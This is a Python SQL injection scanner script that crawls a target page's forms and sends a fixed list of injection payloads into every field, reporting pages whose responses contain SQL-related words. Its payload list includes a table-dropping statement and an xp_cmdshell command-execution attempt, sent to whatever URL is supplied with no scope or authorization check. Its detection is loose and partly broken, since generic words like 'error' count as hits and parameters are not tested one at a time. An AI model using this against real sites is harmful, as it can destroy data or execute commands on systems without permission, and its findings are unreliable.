import requests
import sys
import re
import threading
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from collections import defaultdict
from bs4 import BeautifulSoup

# List of common and advanced SQLi payloads
payloads = [
    "' OR 1=1 --",  # Basic OR-based SQLi
    "' OR 'a'='a",  # Basic OR-based SQLi (alternative)
    "' UNION SELECT NULL, NULL, NULL --",  # Union-based SQLi
    "' OR 1=1#", 
    "' OR 1=1/*", 
    "'; DROP TABLE users; --",  # Dangerous payload to test
    "' AND 1=2 --",  # False condition for blind SQLi
    "' AND 1=2#",  # Another blind SQLi check
    "' WAITFOR DELAY '0:0:5' --",  # Time-based SQLi
    "'; EXEC xp_cmdshell('ping 127.0.0.1') --",  # Attempt to use xp_cmdshell
    "1' OR SLEEP(5)--",  # Time-based SQLi (sleep)
    "'; SELECT table_name FROM information_schema.tables --",  # Union-based SQLi (get table names)
    "' AND 1=0 UNION SELECT null, null, null --",  # Union-based SQLi (malicious)
]

# Error messages to detect SQL injection
error_keywords = [
    "error", "syntax", "warning", "mysql", "sql", "unclosed", "unexpected", "invalid", "select", "database", "extract", "unresolved"
]

# Function to check for SQL injection in the response text
def detect_sqli(response_text):
    for keyword in error_keywords:
        if re.search(r"\b" + re.escape(keyword) + r"\b", response_text, re.IGNORECASE):
            return True
    return False

# Function to scan a URL for SQL injection vulnerabilities
def check_sqli(url, payload, method, headers, data):
    try:
        # Print the payload being tested
        print(f"Trying Payload: {payload}")
        
        if method == 'GET':
            # Append payload to the URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            for key in query_params:
                query_params[key] = [payload]  # Replace with the payload
            parsed_url = parsed_url._replace(query=urlencode(query_params, doseq=True))
            full_url = urlunparse(parsed_url)
            response = requests.get(full_url, headers=headers, timeout=5)

        elif method == 'POST':
            # Use the provided data with the payload
            if data:
                for key in data:
                    data[key] = payload
            response = requests.post(url, data=data, headers=headers, timeout=5)

        # Check for SQL error keywords in the response
        if detect_sqli(response.text):
            print(f"[Vulnerable] SQL injection detected with payload: {payload} on {url}")
            return True
        return False
    except requests.RequestException as e:
        print(f"[Error] Unable to reach URL: {e}")
        return False

# Function to scan parameters dynamically (GET request parameters)
def scan_parameters(url, headers, method, data=None):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    vulnerable = defaultdict(list)

    # Scan all URL parameters
    for param in params:
        for payload in payloads:
            if check_sqli(url, payload, method, headers, data):
                vulnerable[param].append(payload)

    return vulnerable

# Function to scan POST data (form data)
def scan_post_data(url, headers, data):
    vulnerable = defaultdict(list)
    if data:
        for key in data:
            for payload in payloads:
                data_copy = data.copy()  # Avoid mutating the original data
                data_copy[key] = payload
                if check_sqli(url, payload, 'POST', headers, data_copy):
                    vulnerable[key].append(payload)
    return vulnerable

# Function to scan all forms on a page
def scan_forms(url, headers):
    try:
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        forms = soup.find_all('form')
        vulnerable_forms = 0
        
        # Loop through each form and test its fields
        for form in forms:
            inputs = form.find_all('input')
            action = form.get('action', url)
            method = form.get('method', 'GET').upper()
            form_data = {}

            # Collect form data (input names and types)
            for input_field in inputs:
                input_name = input_field.get('name')
                if input_name:
                    form_data[input_name] = payloads[0]  # Replace with a simple payload for testing

            # Scan for SQL injection in the form
            if method == 'POST':
                vulnerable = scan_post_data(action, headers, form_data)
            else:
                vulnerable = scan_parameters(action, headers, method, form_data)
            
            if vulnerable:
                print(f"[INFO] Vulnerable form found: {action}")
                vulnerable_forms += 1

        return vulnerable_forms
    except requests.RequestException as e:
        print(f"[Error] Unable to reach URL for forms: {e}")
        return 0

# Main function
def main():
    if len(sys.argv) < 2:
        print("Usage: python sqlscan.py <URL>")
        sys.exit(1)

    url = sys.argv[1]
    headers = {}  # You can extend this for custom headers (like User-Agent, Cookies, etc.)

    # Scan the page for forms and check if any form is vulnerable
    print(f"Scanning for vulnerable forms in: {url}")
    vulnerable_forms_count = scan_forms(url, headers)

    # Output the number of vulnerable forms
    print(f"FOUND {vulnerable_forms_count} form(s)")

if __name__ == "__main__":
    main()
